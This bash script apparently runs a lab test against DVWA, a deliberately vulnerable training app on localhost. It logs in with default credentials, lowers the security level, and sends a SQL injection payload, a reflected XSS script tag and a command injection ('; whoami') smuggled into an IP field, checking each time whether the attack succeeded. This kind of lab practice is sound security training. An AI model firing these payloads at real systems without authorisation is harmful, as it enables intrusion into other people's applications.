#!/bin/bash

echo "================================================================================"
echo "MANUAL VULNERABILITY TESTING"
echo "================================================================================"

# Login and get session
echo -e "\n[1/5] Logging in to DVWA..."
PHPSESSID=$(curl -s -c - -d 'username=admin&password=password&Login=Login' http://localhost:8080/login.php | grep PHPSESSID | awk '{print $7}')
echo "Session: $PHPSESSID"

# Set security to low
curl -s -b "PHPSESSID=$PHPSESSID" -d 'security=low&seclev_submit=Submit' http://localhost:8080/security.php > /dev/null
echo "✓ Security set to low"

# Test 1: Normal SQL query
echo -e "\n[2/5] Testing SQL Injection - Normal Query (id=1)"
curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" | \
  grep -A 1 "First name:" | head -6

# Test 2: SQL Injection attack
echo -e "\n[3/5] Testing SQL Injection - Attack Payload (id=1' OR '1'='1)"
curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://localhost:8080/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit" | \
  grep -A 1 "First name:" | head -15

# Test 3: XSS Reflected
echo -e "\n[4/5] Testing XSS - Reflected"
RESPONSE=$(curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
  "http://localhost:8080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%281%29%3C%2Fscript%3E")

if echo "$RESPONSE" | grep -q "<script>alert(1)</script>"; then
    echo "✓ XSS payload REFLECTED (vulnerable!)"
    echo "$RESPONSE" | grep "<script>alert(1)</script>" | head -1
else
    echo "✗ XSS payload NOT reflected or encoded"
fi

# Test 4: Command Injection
echo -e "\n[5/5] Testing Command Injection"
RESPONSE=$(curl -s -b "PHPSESSID=$PHPSESSID; security=low" \
  --data-urlencode "ip=127.0.0.1; whoami" \
  -d "Submit=Submit" \
  "http://localhost:8080/vulnerabilities/exec/")

if echo "$RESPONSE" | grep -q "www-data"; then
    echo "✓ Command Injection WORKS (vulnerable!)"
    echo "$RESPONSE" | grep "www-data" | head -3
else
    echo "✗ Command injection did not execute"
fi

echo -e "\n================================================================================"
echo "TESTING COMPLETE"
echo "================================================================================"
